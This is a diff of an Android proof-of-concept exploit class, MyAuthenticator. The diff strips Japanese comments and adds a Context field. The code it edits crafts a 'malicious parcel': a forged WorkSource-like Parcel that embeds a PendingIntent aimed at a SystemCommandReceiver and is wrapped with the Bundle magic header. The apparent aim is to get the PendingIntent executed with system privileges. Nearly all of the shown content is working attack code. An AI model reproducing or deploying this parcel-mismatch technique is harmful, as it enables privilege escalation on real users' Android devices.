@@ -10,11 +10,13 @@ import android.content.Context;
 import android.content.Intent;
 import android.os.Bundle;
 import android.os.Parcel;
-import android.util.Log;
 
 public class MyAuthenticator extends AbstractAccountAuthenticator {
+    private final Context mContext;
+
     public MyAuthenticator(Context context) {
         super(context);
+        this.mContext = context;
     }
 
     @Override
@@ -29,13 +31,11 @@ public class MyAuthenticator extends AbstractAccountAuthenticator {
 
         MainActivity.appendLog("[*] addAccount called. Building malicious parcel with PendingIntent...");
 
-        // PendingIntentを構築（SystemCommandReceiverを起動）
         Intent intent = new Intent();
         intent.setComponent(new ComponentName(
                 "com.example.tzpoc",
                 "com.example.tzpoc.SystemCommandReceiver"
         ));
-        // システム権限でPendingIntentを実行させる
         PendingIntent pendingIntent = PendingIntent.getBroadcast(
                 this.mContext,
                 0,
@@ -43,15 +43,12 @@ public class MyAuthenticator extends AbstractAccountAuthenticator {
                 PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE
         );
 
-        // PendingIntentをParcelに書き込む
         Parcel pendingParcel = Parcel.obtain();
         pendingIntent.writeToParcel(pendingParcel, 0);
 
-        // データParcelの構築（WorkSourceを模倣）
         Parcel dataParcel = Parcel.obtain();
         Parcel finalParcel = Parcel.obtain();
 
-        // WorkSource のヘッダー
         dataParcel.writeInt(3);
         dataParcel.writeInt(13);
         dataParcel.writeInt(2);
@@ -89,29 +86,25 @@ public class MyAuthenticator extends AbstractAccountAuthenticator {
         dataParcel.writeInt(13);
         dataParcel.writeInt(-1);
 
-        // PendingIntent データの埋め込み（キーは "intent" にしているが、実際は PendingIntent が入る）
         int intentStartPos = dataParcel.dataPosition();
         dataParcel.writeString("intent");
-        dataParcel.writeInt(4);          // PARCELABLE
+        dataParcel.writeInt(4);
         dataParcel.writeString("android.app.PendingIntent");
         dataParcel.appendFrom(pendingParcel, 0, pendingParcel.dataSize());
 
-        // 長さを修正
         int intentEndPos = dataParcel.dataPosition();
         dataParcel.setDataPosition(intentStartPos - 4);
         dataParcel.writeInt(intentEndPos - intentStartPos);
         dataParcel.setDataPosition(intentEndPos);
 
-        // Bundle 用のラッパー
         int totalSize = dataParcel.dataSize();
         MainActivity.appendLog("[+] Malicious parcel size: 0x" + Integer.toHexString(totalSize));
 
         finalParcel.writeInt(totalSize);
-        finalParcel.writeInt(0x4c444e42); // "BDNL"
+        finalParcel.writeInt(0x4c444e42);
         finalParcel.appendFrom(dataParcel, 0, totalSize);
         finalParcel.setDataPosition(0);
 
-        // Bundle に変換
         Bundle result = new Bundle();
         try {
             result.readFromParcel(finalParcel);
@@ -128,7 +121,6 @@ public class MyAuthenticator extends AbstractAccountAuthenticator {
         return result;
     }
 
-    // その他のオーバーライド（空実装）
     @Override
     public Bundle confirmCredentials(AccountAuthenticatorResponse response, Account account, Bundle options) {
         return null;
